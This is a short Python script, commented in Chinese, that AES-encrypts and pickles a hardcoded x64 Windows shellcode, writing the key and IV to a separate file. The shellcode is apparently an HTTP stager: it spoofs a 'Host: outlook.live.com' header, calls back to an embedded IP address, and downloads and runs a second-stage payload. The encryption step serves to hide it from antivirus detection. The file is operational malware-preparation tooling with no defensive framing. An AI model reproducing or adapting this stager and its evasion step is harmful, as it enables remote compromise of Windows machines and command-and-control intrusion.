from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.padding import PKCS7
import base64
import pickle

# 生成密钥和 IV
key = b'ljjyyds159512345'
iv = b'fedcba9876541595'

# 将密钥和 IV 写入到一个文件
with open('keywords.txt', 'w') as f:
    f.write(f"{base64.b64encode(key).decode()}\n")
    f.write(f"{base64.b64encode(iv).decode()}\n")

# 原始 shellcode 示例
shellcode = b'\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\xc2\x25\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x52\x70\x63\x00\x7f\x89\xe7\x78\xcd\x51\xeb\x61\x30\x80\x92\x34\xc5\x6d\xb6\x47\x3c\xad\x4f\xd4\x2e\x57\xc0\x88\x6d\x42\xc0\x2e\x8b\x0a\xfd\x9f\xb7\x54\x80\xc2\x9f\x4d\xb0\x3d\x3b\xba\x1e\xa8\xf7\x09\x7b\xb5\xcf\xde\x4a\x79\xf1\x90\xe2\x4b\xdb\xf8\xcd\xa5\x35\x8e\xbc\x47\x8b\xe2\xb4\x00\x0a\x50\xc9\xb6\x0c\x1f\x00\x48\x6f\x73\x74\x3a\x20\x6f\x75\x74\x6c\x6f\x6f\x6b\x2e\x6c\x69\x76\x65\x2e\x63\x6f\x6d\x0d\x0a\x41\x63\x63\x65\x70\x74\x3a\x20\x2a\x2f\x2a\x0d\x0a\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x29\x20\x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35\x33\x37\x2e\x33\x36\x20\x28\x4b\x48\x54\x4d\x4c\x2c\x20\x6c\x69\x6b\x65\x20\x47\x65\x63\x6b\x6f\x29\x0d\x0a\x00\x6e\x4b\x1c\xa6\x75\x5a\xe5\x29\x97\x5e\x06\x33\x17\xc6\x3e\x1e\xbc\x6a\x18\x89\xd6\x88\x32\x11\xf9\x5c\xb3\x82\x7b\x77\x97\x81\x7f\x4e\x9b\x14\x8a\xb2\xbc\x5d\x1b\x43\x9b\xf6\xad\x3c\x9d\x19\xb1\x2a\xae\x31\x88\x04\x1d\x6c\x90\xe9\x34\x0b\x31\x3b\x6d\x71\xdd\xe9\x20\xdc\xfe\x4a\x81\x58\x88\x58\x55\x73\xf2\xe3\xdc\x1b\x43\x51\xd2\x17\x21\x8c\xfe\x3b\x59\x6c\x9f\xe5\x61\x02\xb0\xc5\xc9\x52\x6b\x05\x10\xfd\x45\x74\x8b\x01\x1a\xab\xae\x21\x19\x41\xad\x9e\x7a\x33\x92\x7d\x4f\x52\x75\x75\xcf\xe2\x1c\xa1\x1e\x94\x8c\x98\xc9\xac\x0e\xf2\x3b\x31\x10\x7a\x07\xe7\xbf\xb0\x41\x11\x19\x6a\x26\x39\x3d\xef\xb7\x3b\xd3\x47\x91\x6c\xd7\xd1\x49\xd6\xbc\x1d\x8c\x06\xce\x95\xe9\x21\x83\x55\x27\x83\xe2\xda\x32\x77\x31\x36\x58\x66\xaa\x81\x6f\x2c\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x31\x38\x2e\x31\x37\x38\x2e\x32\x32\x39\x2e\x33\x36\x00\x51\x09\xbf\x6d'

# 使用 AES 加密 shellcode
cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
encryptor = cipher.encryptor()
padder = PKCS7(algorithms.AES.block_size).padder()

padded_shellcode = padder.update(shellcode) + padder.finalize()
encrypted_shellcode = encryptor.update(padded_shellcode) + encryptor.finalize()

# 使用 Base64 编码加密后的 shellcode
B64EnShellcode = base64.b64encode(encrypted_shellcode)

# 使用 pickle 序列化并保存到文件
with open('encrypted_shellcode.pkl', 'wb') as f:
    pickle.dump(B64EnShellcode, f)
